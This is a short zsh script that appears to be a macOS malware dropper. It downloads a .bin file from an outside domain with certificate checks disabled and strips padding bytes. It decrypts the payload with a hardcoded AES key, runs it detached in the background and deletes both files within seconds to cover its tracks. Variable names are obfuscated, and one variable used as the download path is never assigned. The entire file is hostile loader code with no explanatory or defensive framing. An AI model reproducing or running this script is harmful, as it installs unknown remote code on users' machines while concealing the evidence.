#!/bin/zsh
ces5d=$(mktemp /tmp/66wkpq.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m8d87a6ac12787ba3.bin" -o "$ces5dz" || exit 1
vaaqkg=$(stat -f %z "$ces5dz"); edk72nh=$(( vaaqkg - 838 - 1836 ))
tail -c +$(( 838 + 1 )) "$ces5dz" | head -c $edk72nh | openssl enc -d -aes-256-cbc -k e7769247182c61648e3d14cc -out "$ces5d" 2>/dev/null
[ -s "$ces5d" ] && chmod 700 "$ces5d" && ( "$ces5d" & ) && disown
( sleep 3; rm -f "$ces5d" "$ces5dz" ) &>/dev/null &
